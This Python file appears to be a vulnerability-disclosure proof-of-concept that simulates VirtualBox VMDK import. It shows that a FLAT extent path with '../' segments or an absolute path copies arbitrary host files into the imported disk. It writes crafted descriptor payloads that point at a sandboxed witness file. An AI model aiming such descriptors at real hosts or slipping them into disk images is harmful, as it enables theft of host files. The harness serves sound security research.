#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: vbox-vmdk-sparse-extent (High: 7.7)
#  Vendor: Oracle VM VirtualBox OSS (Oracle)
#  Versions: VirtualBox OSS 7.2.20 (f2792cf44)
#  Impact: sparse VMDK FLAT extent path join copies host files into the imported disk
#  Requires: UI:R import of sparse VMDK descriptor plus FLAT extent (not streamOptimized)
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "vbox-vmdk-sparse-extent"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Source harness for VirtualBox sparse VMDK FLAT/sparse extent path (G6).

Reimplements vmdkDescriptorReadAscii after vmdkParseDescriptor: pszBasename
starting with RTPATH_SLASH is used as-is; otherwise RTPathJoinA(descriptor
dir, pszBasename) which follows ../. FLAT then vmdkFileOpen that full path
and import copies those bytes. streamOptimized (VMDK magic) does not take
this walk. Does not boot VirtualBox.
"""

import os
import struct
from dataclasses import dataclass
from enum import Enum
from pathlib import Path

LABEL = "vbox-vmdk-sparse-extent"
WITNESS = "VBOX-VMDK-SPARSE-EXTENT-WITNESS"
PIN = "v7.2.20 f2792cf44f663989818507e36d3db5f978523c5e"
RTPATH_SLASH = "/"
VMDK_SPARSE_MAGICNUMBER = 0x564D444B
WITNESS_BYTES = WITNESS.encode("utf-8")
CONTROL_PAYLOAD = b"CONTROL-FLAT-NOT-ORACLE"
STREAM_PAYLOAD = b"STREAMOPTIMIZED-SELF-NOT-ORACLE"

DESCRIPTOR_DIR = Path("/work/import/disk")
ORACLE_DIR = Path("/work/oracle")
ORACLE_PATH = ORACLE_DIR / WITNESS
DEST_OUT = Path("/work/import/out.vmdk")
CONTROL_FLAT = DESCRIPTOR_DIR / "disk-flat.vmdk"
CONTROL_DESC = DESCRIPTOR_DIR / "disk.vmdk"
RELATIVE_DESC = DESCRIPTOR_DIR / "rel.vmdk"
ABSOLUTE_DESC = DESCRIPTOR_DIR / "abs.vmdk"
STREAM_DESC = DESCRIPTOR_DIR / "stream.vmdk"
RELATIVE_BASENAME = f"../../oracle/{WITNESS}"
ABSOLUTE_BASENAME = f"/work/oracle/{WITNESS}"
CONTROL_BASENAME = "disk-flat.vmdk"


class ExtentType(Enum):
    HOSTED_SPARSE = "SPARSE"
    FLAT = "FLAT"
    ZERO = "ZERO"
    VMFS = "VMFS"


class DescriptorKind(Enum):
    SPARSE_MAGIC = "sparse-magic"
    ASCII = "ascii"


@dataclass(frozen=True)
class Extent:
    access: str
    sectors: int
    enm_type: ExtentType
    psz_basename: str | None
    sector_offset: int


@dataclass(frozen=True)
class ParsedDescriptor:
    create_type: str
    stream_optimized: bool
    extents: tuple[Extent, ...]


@dataclass(frozen=True)
class OpenedImage:
    kind: DescriptorKind
    consulted_external_extent: bool
    psz_fullname: str
    psz_basename: str | None
    bytes_copied: bytes


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def rt_path_strip_filename(path: str) -> str:
    """RTPathStripFilename: truncate at last slash; '.' if none; keep root slash."""
    last_sep: int | None = None
    for index, char in enumerate(path):
        if char == "/" or char == RTPATH_SLASH:
            last_sep = index
    if last_sep is None:
        return "."
    if last_sep == 0:
        return path[:1]
    return path[:last_sep]


def rt_path_join_a(path_src: str, append: str) -> str:
    """RTPathJoinA / RTPathAppend Unix: slash-balance only. Does not collapse .."""
    if not append:
        return path_src
    if not path_src:
        return append
    if path_src[-1] not in ("/", RTPATH_SLASH):
        if append[0] not in ("/", RTPATH_SLASH):
            return f"{path_src}{RTPATH_SLASH}{append}"
        return path_src + append
    stripped = append.lstrip("/")
    return path_src + stripped


def resolve_extent_fullname(descriptor_filename: str, psz_basename: str) -> str:
    """VMDK.cpp:3472-3503 after vmdkParseDescriptor."""
    if psz_basename[0] == RTPATH_SLASH:
        return psz_basename
    dirname = rt_path_strip_filename(descriptor_filename)
    return rt_path_join_a(dirname, psz_basename)


def is_under(path: Path, root: Path) -> bool:
    path_n = Path(os.path.normpath(str(path)))
    root_n = Path(os.path.normpath(str(root)))
    return path_n == root_n or root_n in path_n.parents


def vmdk_string_unquote(token: str) -> str:
    stripped = token.strip()
    if stripped.startswith('"'):
        end = stripped.find('"', 1)
        if end < 0:
            raise ValueError("unquoted-extent-name")
        return stripped[1:end]
    return stripped.split()[0]


def parse_extent_line(line: str) -> Extent | None:
    """vmdkParseDescriptor extent walk: access, sectors, type, quoted basename."""
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None
    if raw.startswith("RW"):
        access, rest = "RW", raw[2:]
    elif raw.startswith("RDONLY"):
        access, rest = "RDONLY", raw[6:]
    elif raw.startswith("NOACCESS"):
        access, rest = "NOACCESS", raw[8:]
    else:
        return None
    if not rest.startswith(" "):
        raise ValueError("extent-missing-space-after-access")
    rest = rest[1:]
    parts = rest.split(" ", 2)
    if len(parts) < 2:
        raise ValueError("extent-truncated")
    sectors = int(parts[0], 10)
    type_token = parts[1]
    remainder = parts[2] if len(parts) > 2 else ""
    try:
        enm_type = ExtentType(type_token)
    except ValueError as exc:
        raise ValueError(f"unknown-extent-type {type_token}") from exc
    if enm_type is ExtentType.ZERO:
        return Extent(access, sectors, enm_type, None, 0)
    if not remainder:
        raise ValueError("extent-missing-basename")
    name_and_off = remainder.strip()
    if name_and_off.startswith('"'):
        end = name_and_off.find('"', 1)
        if end < 0:
            raise ValueError("extent-unclosed-quote")
        psz_basename = name_and_off[1:end]
        tail = name_and_off[end + 1 :].strip()
    else:
        bits = name_and_off.split(None, 1)
        psz_basename = bits[0]
        tail = bits[1] if len(bits) > 1 else ""
    sector_offset = int(tail, 10) if tail else 0
    return Extent(access, sectors, enm_type, psz_basename, sector_offset)


def parse_ascii_descriptor(text: str) -> ParsedDescriptor:
    lines = text.replace("\r\n", "\n").replace("\r", "\n").split("\n")
    if not lines or lines[0] not in {
        "# Disk DescriptorFile",
        "# Disk Descriptor File",
        "#Disk Descriptor File",
        "#Disk DescriptorFile",
    }:
        raise ValueError("descriptor-header-mismatch")
    create_type = ""
    extents: list[Extent] = []
    for line in lines[1:]:
        stripped = line.strip()
        if stripped.startswith("createType"):
            _, _, value = stripped.partition("=")
            create_type = vmdk_string_unquote(value)
            continue
        extent = parse_extent_line(stripped)
        if extent is not None:
            extents.append(extent)
    if not extents:
        raise ValueError("no-extents")
    return ParsedDescriptor(
        create_type=create_type,
        stream_optimized=create_type == "streamOptimized",
        extents=tuple(extents),
    )


def read_magic(path: Path) -> int | None:
    with path.open("rb") as handle:
        blob = handle.read(4)
    if len(blob) < 4:
        return None
    return struct.unpack("<I", blob)[0]


def descriptor_kind(path: Path) -> DescriptorKind:
    """vmdkDescriptorRead: VMDK magic -> sparse/streamOptimized, else ASCII."""
    magic = read_magic(path)
    if magic == VMDK_SPARSE_MAGICNUMBER:
        return DescriptorKind.SPARSE_MAGIC
    return DescriptorKind.ASCII


def vmdk_file_open(psz_fullname: str) -> bytes:
    """vmdkFileOpen of pszFullname; import copies those bytes into the dest disk."""
    with open(psz_fullname, "rb") as handle:
        return handle.read()


def write_ascii_descriptor(path: Path, create_type: str, basename: str) -> None:
    body = (
        "# Disk DescriptorFile\n"
        "version=1\n"
        "CID=fffffffe\n"
        "parentCID=ffffffff\n"
        f'createType="{create_type}"\n'
        "\n"
        "# Extent description\n"
        f'RW 1 FLAT "{basename}" 0\n'
        "\n"
        "# The Disk Data Base\n"
        "#DDB\n"
        'ddb.virtualHWVersion = "4"\n'
        'ddb.adapterType = "ide"\n'
    )
    path.write_text(body, encoding="utf-8")


def write_streamoptimized(path: Path, hostile_basename: str) -> None:
    """Single-file streamOptimized: magic first. Embedded ASCII is not opened."""
    embedded = (
        "# Disk DescriptorFile\n"
        "version=1\n"
        "CID=fffffffe\n"
        "parentCID=ffffffff\n"
        'createType="streamOptimized"\n'
        "\n"
        "# Extent description\n"
        f'RW 1 FLAT "{hostile_basename}" 0\n'
        "\n"
        "# The Disk Data Base\n"
        "#DDB\n"
        'ddb.virtualHWVersion = "4"\n'
        'ddb.adapterType = "ide"\n'
    ).encode("utf-8")
    with path.open("wb") as handle:
        handle.write(struct.pack("<I", VMDK_SPARSE_MAGICNUMBER))
        handle.write(STREAM_PAYLOAD)
        handle.write(embedded)


def import_ascii_flat(descriptor: Path, dest: Path) -> OpenedImage:
    kind = descriptor_kind(descriptor)
    if kind is not DescriptorKind.ASCII:
        raise ValueError("expected-ascii-descriptor")
    parsed = parse_ascii_descriptor(descriptor.read_text(encoding="utf-8"))
    extent = parsed.extents[0]
    if extent.enm_type is not ExtentType.FLAT:
        raise ValueError(f"expected-flat got={extent.enm_type}")
    if extent.psz_basename is None:
        raise ValueError("flat-missing-basename")
    fullname = resolve_extent_fullname(str(descriptor), extent.psz_basename)
    copied = vmdk_file_open(fullname)
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_bytes(copied)
    return OpenedImage(
        kind=kind,
        consulted_external_extent=True,
        psz_fullname=fullname,
        psz_basename=extent.psz_basename,
        bytes_copied=copied,
    )


def import_streamoptimized(descriptor: Path, dest: Path) -> OpenedImage:
    """vmdkDescriptorReadSparse: already-open file is the extent. No pszBasename open."""
    kind = descriptor_kind(descriptor)
    if kind is not DescriptorKind.SPARSE_MAGIC:
        raise ValueError("expected-sparse-magic")
    blob = descriptor.read_bytes()
    ascii_at = blob.find(b"# Disk DescriptorFile")
    parsed: ParsedDescriptor | None = None
    if ascii_at >= 0:
        parsed = parse_ascii_descriptor(blob[ascii_at:].decode("utf-8"))
        if not parsed.stream_optimized:
            raise ValueError("embedded-createType-not-streamOptimized")
        if parsed.extents[0].psz_basename == ABSOLUTE_BASENAME:
            log("ioc stream-embedded-extent-names-oracle=yes (not opened)")
    dest.write_bytes(blob)
    return OpenedImage(
        kind=kind,
        consulted_external_extent=False,
        psz_fullname=str(descriptor),
        psz_basename=parsed.extents[0].psz_basename if parsed else None,
        bytes_copied=blob,
    )


def setup_oracle() -> str | None:
    try:
        DESCRIPTOR_DIR.mkdir(parents=True, exist_ok=True)
        ORACLE_DIR.mkdir(parents=True, exist_ok=True)
        DEST_OUT.parent.mkdir(parents=True, exist_ok=True)
        ORACLE_PATH.write_bytes(WITNESS_BYTES)
        CONTROL_FLAT.write_bytes(CONTROL_PAYLOAD)
    except OSError as exc:
        return f"setup {exc}"
    if ORACLE_PATH.read_bytes() != WITNESS_BYTES:
        return "oracle-body-mismatch"
    if WITNESS_BYTES in CONTROL_FLAT.read_bytes():
        return "control-flat-has-witness"
    return None


def prove_control() -> str | None:
    write_ascii_descriptor(CONTROL_DESC, "monolithicFlat", CONTROL_BASENAME)
    opened = import_ascii_flat(CONTROL_DESC, Path("/work/import/out-control.vmdk"))
    log(f"ioc control-basename={opened.psz_basename}")
    log(f"ioc control-fullname={opened.psz_fullname}")
    want = rt_path_join_a(str(DESCRIPTOR_DIR), CONTROL_BASENAME)
    if opened.psz_fullname != want:
        return f"control-join-mismatch got={opened.psz_fullname}"
    if not is_under(Path(opened.psz_fullname), DESCRIPTOR_DIR):
        return "control-escaped-folder"
    if os.path.normpath(opened.psz_fullname) == os.path.normpath(str(ORACLE_PATH)):
        return "control-opened-oracle"
    if opened.bytes_copied != CONTROL_PAYLOAD:
        return f"control-bytes got={opened.bytes_copied!r}"
    if opened.bytes_copied == WITNESS_BYTES:
        return "control-copied-witness"
    log("ioc control-in-folder=yes")
    return None


def prove_relative() -> str | None:
    write_ascii_descriptor(RELATIVE_DESC, "monolithicFlat", RELATIVE_BASENAME)
    opened = import_ascii_flat(RELATIVE_DESC, Path("/work/import/out-relative.vmdk"))
    log(f"ioc relative-basename={opened.psz_basename}")
    log(f"ioc relative-fullname={opened.psz_fullname}")
    dirname = rt_path_strip_filename(str(RELATIVE_DESC))
    want = rt_path_join_a(dirname, RELATIVE_BASENAME)
    if opened.psz_fullname != want:
        return f"relative-join-mismatch got={opened.psz_fullname}"
    if ".." not in Path(opened.psz_fullname).parts and ".." not in opened.psz_fullname:
        return "relative-join-collapsed-dotdot"
    if is_under(Path(os.path.normpath(opened.psz_fullname)), DESCRIPTOR_DIR):
        return "relative-stayed-in-folder"
    if os.path.normpath(opened.psz_fullname) != os.path.normpath(str(ORACLE_PATH)):
        return f"relative-not-oracle got={os.path.normpath(opened.psz_fullname)}"
    if opened.bytes_copied != WITNESS_BYTES:
        return f"relative-bytes got={opened.bytes_copied!r}"
    DEST_OUT.write_bytes(opened.bytes_copied)
    log("ioc relative-escape=yes")
    return None


def prove_absolute() -> str | None:
    write_ascii_descriptor(ABSOLUTE_DESC, "monolithicFlat", ABSOLUTE_BASENAME)
    opened = import_ascii_flat(ABSOLUTE_DESC, Path("/work/import/out-absolute.vmdk"))
    log(f"ioc absolute-basename={opened.psz_basename}")
    log(f"ioc absolute-fullname={opened.psz_fullname}")
    if opened.psz_basename is None or opened.psz_basename[0] != RTPATH_SLASH:
        return "absolute-basename-not-slash"
    if opened.psz_fullname != ABSOLUTE_BASENAME:
        return f"absolute-not-as-is got={opened.psz_fullname}"
    if opened.psz_fullname != str(ORACLE_PATH):
        return "absolute-not-oracle"
    if is_under(Path(opened.psz_fullname), DESCRIPTOR_DIR):
        return "absolute-landed-in-folder"
    if opened.bytes_copied != WITNESS_BYTES:
        return f"absolute-bytes got={opened.bytes_copied!r}"
    log("ioc absolute-extent=yes")
    return None


def prove_streamoptimized() -> str | None:
    write_streamoptimized(STREAM_DESC, ABSOLUTE_BASENAME)
    opened = import_streamoptimized(STREAM_DESC, Path("/work/import/out-stream.vmdk"))
    log(f"ioc stream-kind={opened.kind.value}")
    log(f"ioc stream-consulted-external={str(opened.consulted_external_extent).lower()}")
    log(f"ioc stream-fullname={opened.psz_fullname}")
    if opened.kind is not DescriptorKind.SPARSE_MAGIC:
        return "stream-missed-magic-branch"
    if opened.consulted_external_extent:
        return "stream-consulted-external-extent"
    if opened.psz_fullname != str(STREAM_DESC):
        return "stream-fullname-not-self"
    if opened.bytes_copied == WITNESS_BYTES:
        return "stream-copied-oracle"
    if WITNESS_BYTES in opened.bytes_copied and opened.bytes_copied[:4] != struct.pack(
        "<I", VMDK_SPARSE_MAGICNUMBER
    ):
        return "stream-dest-is-oracle"
    if not opened.bytes_copied.startswith(struct.pack("<I", VMDK_SPARSE_MAGICNUMBER)):
        return "stream-dest-missing-magic"
    if STREAM_PAYLOAD not in opened.bytes_copied:
        return "stream-dest-missing-self-payload"
    log("ioc streamoptimized-consults-extent=no")
    return None


def main() -> int:
    log(f"label={LABEL} pin={PIN} witness={WITNESS}")
    log("ioc gadget=source-harness vmdk-extent-path-join vmdkFileOpen")
    log("ioc vbox-boot=no")
    log(f"ioc descriptor-dir={DESCRIPTOR_DIR}")
    log(f"ioc oracle={ORACLE_PATH}")
    log(f"ioc dest={DEST_OUT}")

    err = setup_oracle()
    if err is not None:
        return fail(err)

    err = prove_control()
    if err is not None:
        return fail(err)
    control_in_folder = True

    err = prove_relative()
    if err is not None:
        return fail(err)
    relative_escape = True

    err = prove_absolute()
    if err is not None:
        return fail(err)
    absolute_extent = True

    err = prove_streamoptimized()
    if err is not None:
        return fail(err)

    if DEST_OUT.read_bytes() != WITNESS_BYTES:
        return fail("dest-out-missing-witness")

    if not (relative_escape and absolute_extent and control_in_folder):
        return fail("token-incomplete")

    log(
        f"SUCCESS {LABEL} relative-escape=yes absolute-extent=yes "
        f"control-in-folder=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

